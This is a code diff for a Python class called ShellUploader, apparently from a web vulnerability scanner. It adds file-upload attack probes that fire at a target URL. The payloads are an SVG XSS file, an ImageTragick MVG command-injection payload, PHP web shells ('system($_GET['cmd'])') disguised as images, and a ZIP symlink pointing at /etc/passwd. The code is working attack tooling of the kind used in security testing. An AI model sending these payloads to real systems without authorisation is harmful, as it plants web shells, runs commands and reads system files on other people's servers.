@@ -30,8 +30,90 @@ class ShellUploader:
         pass  # Upload tests are handled by run() with forms
     
     def test_url(self, url: str):
-        """Test URL for file upload"""
-        pass
+        """Test URL for file upload vulnerabilities"""
+        self._test_svg_xss(url)
+        self._test_imagetragick(url)
+        self._test_content_type_mismatch(url)
+        self._test_zip_symlink(url)
+    
+    def _test_svg_xss(self, url: str):
+        """Test SVG XSS upload"""
+        svg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>SVG XSS</text></svg>'
+        try:
+            files = {'file': ('test.svg', svg.encode(), 'image/svg+xml')}
+            response = self.requester.request(url, 'POST', files=files)
+            if response and ('svg' in response.text.lower() or response.status_code == 200):
+                from core.engine import Finding
+                self.engine.add_finding(Finding(
+                    technique="File Upload (SVG XSS)", url=url,
+                    severity='MEDIUM', confidence=0.6, param='file',
+                    payload='test.svg with onload=alert(1)',
+                    evidence="SVG file with XSS accepted",
+                ))
+        except Exception:
+            pass
+
+    def _test_imagetragick(self, url: str):
+        """Test ImageMagick exploit (ImageTragick)"""
+        payload = 'push graphic-context\nviewbox 0 0 640 480\nfill "url(https://example.com/image.jpg|id)"\npop graphic-context\n'
+        try:
+            files = {'file': ('exploit.mvg', payload.encode(), 'image/x-mvg')}
+            response = self.requester.request(url, 'POST', files=files)
+            if response and response.status_code in (200, 201, 301, 302):
+                from core.engine import Finding
+                self.engine.add_finding(Finding(
+                    technique="File Upload (ImageTragick)", url=url,
+                    severity='HIGH', confidence=0.5, param='file',
+                    payload='exploit.mvg',
+                    evidence="ImageMagick exploit accepted",
+                ))
+        except Exception:
+            pass
+
+    def _test_content_type_mismatch(self, url: str):
+        """Test content-type mismatch bypass"""
+        for fname, content, ctype in [
+            ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'image/png'),
+            ('shell.phtml', b'<?php system($_GET["cmd"]); ?>', 'image/gif'),
+        ]:
+            try:
+                files = {'file': (fname, content, ctype)}
+                response = self.requester.request(url, 'POST', files=files)
+                if response and response.status_code in (200, 201):
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique="File Upload (Content-Type Mismatch)", url=url,
+                        severity='HIGH', confidence=0.6, param='file',
+                        payload=f'{fname} as {ctype}',
+                        evidence="PHP file accepted with image content-type",
+                    ))
+                    return
+            except Exception:
+                continue
+
+    def _test_zip_symlink(self, url: str):
+        """Test ZIP symlink attack"""
+        import zipfile, io
+        try:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, 'w') as zf:
+                info = zipfile.ZipInfo('symlink.txt')
+                info.create_system = 3
+                info.external_attr = 0xA1ED0000
+                zf.writestr(info, '/etc/passwd')
+            buf.seek(0)
+            files = {'file': ('test.zip', buf.read(), 'application/zip')}
+            response = self.requester.request(url, 'POST', files=files)
+            if response and response.status_code in (200, 201):
+                from core.engine import Finding
+                self.engine.add_finding(Finding(
+                    technique="File Upload (ZIP Symlink Attack)", url=url,
+                    severity='HIGH', confidence=0.5, param='file',
+                    payload='ZIP with symlink to /etc/passwd',
+                    evidence="ZIP with symlink accepted",
+                ))
+        except Exception:
+            pass
     
     def run(self, findings: list, forms: list):
         """Attempt to upload shells based on findings"""
